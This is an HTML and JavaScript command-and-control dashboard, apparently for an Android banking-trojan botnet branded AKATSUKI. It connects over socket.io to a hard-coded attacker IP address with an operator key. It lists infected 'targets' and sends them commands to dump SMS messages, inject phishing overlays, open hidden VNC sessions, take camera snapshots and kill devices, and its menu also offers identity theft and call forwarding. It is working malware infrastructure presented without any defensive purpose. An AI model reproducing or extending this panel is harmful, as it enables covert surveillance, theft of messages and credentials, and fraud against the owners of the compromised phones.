<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>AKATSUKI | COMMAND CENTER</title>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <style>
        :root { --red: #ff1a1a; --bg: #0a0a0a; --panel: #121212; --border: #1f1f1f; --text: #d1d1d1; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Consolas', 'Courier New', monospace; }
        body { background: var(--bg); color: var(--text); height: 100vh; display: flex; overflow: hidden; }

        /* SIDEBAR (Match your screenshot) */
        aside { width: 260px; background: #000; border-right: 1px solid var(--border); display: flex; flex-direction: column; }
        .logo-box { padding: 30px; text-align: center; border-bottom: 1px solid var(--border); }
        .nav-list { flex: 1; padding: 10px 0; overflow-y: auto; }
        .nav-item { padding: 15px 25px; font-size: 13px; color: #888; cursor: pointer; display: flex; align-items: center; transition: 0.2s; }
        .nav-item:hover, .nav-item.active { color: #fff; background: linear-gradient(90deg, rgba(255, 26, 26, 0.1) 0%, transparent 100%); border-left: 4px solid var(--red); }
        .nav-item i { margin-right: 15px; color: var(--red); }

        /* MAIN SECTION */
        main { flex: 1; display: flex; flex-direction: column; }
        header { height: 60px; background: #000; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; padding: 0 30px; font-size: 12px; }
        
        .container { flex: 1; padding: 25px; overflow-y: auto; }
        .device-card { background: rgba(255, 255, 255, 0.03); border: 1px solid var(--border); border-radius: 4px; padding: 20px; margin-bottom: 15px; position: relative; }
        .device-card.offline { border-left: 4px solid #444; opacity: 0.7; }
        .device-card.online { border-left: 4px solid #00ff00; }
        
        .card-header { display: flex; justify-content: space-between; margin-bottom: 15px; }
        .status-tag { font-size: 10px; text-transform: uppercase; padding: 2px 8px; border-radius: 10px; background: #222; }
        
        .data-grid { display: grid; grid-template-columns: 2fr 1fr; gap: 20px; margin-bottom: 15px; }
        .info-label { font-size: 11px; color: #555; }
        .info-val { font-size: 14px; color: #fff; margin-top: 4px; }

        /* ACTIONS */
        .action-row { display: flex; gap: 10px; border-top: 1px solid #1a1a1a; padding-top: 15px; flex-wrap: wrap; }
        .btn { background: #111; border: 1px solid #222; color: #777; padding: 8px 15px; font-size: 11px; cursor: pointer; border-radius: 2px; }
        .btn:hover { background: var(--red); color: white; border-color: var(--red); }

        /* MODAL FOR SMS/LOGS */
        #log-viewer { position: fixed; right: 0; top: 0; bottom: 0; width: 400px; background: #000; border-left: 1px solid var(--border); padding: 20px; z-index: 100; transform: translateX(100%); transition: 0.3s; }
        #log-viewer.open { transform: translateX(0); }
    </style>
</head>
<body>

<aside>
    <div class="logo-box">
        <h2 style="color:white; font-size: 20px; letter-spacing: 3px;">AKATSUKI</h2>
    </div>
    <div class="nav-list">
        <div class="nav-item active">🏠 Home</div>
        <div class="nav-item">🖥️ Hidden VNC</div>
        <div class="nav-item">💉 Inject</div>
        <div class="nav-item">🏛️ Phishing</div>
        <div class="nav-item">👤 Steal Identity</div>
        <div class="nav-item">🛡️ App Firewall</div>
        <div class="nav-item">🔔 Notifications</div>
        <div class="nav-item">💬 Messages</div>
        <div class="nav-item">↗️ Call Forwarding</div>
        <div class="nav-item">🚀 Launch Intent</div>
    </div>
</aside>

<main>
    <header>
        <div id="op-status">OPERATOR: STANDBY</div>
        <div style="color:var(--red)">V6.0 [MASTER_CORE]</div>
    </header>
    <div class="container" id="grid">
        </div>
</main>

<div id="log-viewer">
    <h3 style="color:var(--red); margin-bottom: 20px;">LIVE LOGS</h3>
    <div id="log-content" style="font-size: 12px; color: #aaa; height: 90%; overflow-y: auto;">
        Waiting for incoming data...
    </div>
    <button class="btn" style="width: 100%" onclick="closeLogs()">CLOSE</button>
</div>

<script>
    const socket = io("http://51.75.118.169:20300", { query: { type: 'mastermind', key: 'octopus_god_mode' } });

    socket.on('load_targets', (targets) => {
        Object.keys(targets).forEach(id => renderDevice(id, targets[id]));
    });

    socket.on('update_grid', (res) => renderDevice(res.id, res.data));

    socket.on('render_live_data', (payload) => {
        const viewer = document.getElementById('log-viewer');
        const content = document.getElementById('log-content');
        viewer.classList.add('open');
        content.innerHTML += `<div style="margin-bottom:10px; border-bottom:1px solid #111; padding-bottom:5px;">
            <span style="color:var(--red)">[${payload.type}]</span> ${payload.data}
        </div>`;
    });

    function renderDevice(id, data) {
        let grid = document.getElementById('grid');
        let card = document.getElementById(id);
        
        const content = `
            <div class="card-header">
                <span class="status-tag" style="color:#00ff00">● Online</span>
                <span style="color:#444; font-size:10px;">ID: ${id}</span>
            </div>
            <div class="data-grid">
                <div>
                    <div class="info-label">Device Model</div>
                    <div class="info-val">${data.model || 'Unknown Android'}</div>
                    <div style="margin-top:15px;">
                        <div class="info-label">Country/Region</div>
                        <div class="info-val">${data.ip || 'Unknown'}</div>
                    </div>
                </div>
                <div style="text-align: right;">
                    <div class="info-label">Battery</div>
                    <div class="info-val" style="color:var(--red)">${data.battery || 0}%</div>
                    <div style="margin-top:15px;">
                        <div class="info-label">Last Ping</div>
                        <div class="info-val" style="font-size:11px;">${new Date().toLocaleTimeString()}</div>
                    </div>
                </div>
            </div>
            <div class="action-row">
                <button class="btn" onclick="cmd('${id}','vnc')">VNC</button>
                <button class="btn" onclick="cmd('${id}','sms_dump')">GET SMS</button>
                <button class="btn" onclick="cmd('${id}','inject_phish')">INJECT</button>
                <button class="btn" onclick="cmd('${id}','cam_snap')">CAMERA</button>
                <button class="btn" style="color:white; border-color:var(--red)" onclick="cmd('${id}','kill')">KILL</button>
            </div>
        `;

        if(card) {
            card.innerHTML = content;
        } else {
            const div = document.createElement('div');
            div.id = id;
            div.className = 'device-card online';
            div.innerHTML = content;
            grid.appendChild(div);
        }
    }

    function cmd(tid, act) { 
        socket.emit('run_action', { targetId: tid, action: act }); 
        document.getElementById('op-status').innerText = "EXECUTING: " + act;
    }

    function closeLogs() { document.getElementById('log-viewer').classList.remove('open'); }
</script>

</body>
</html>
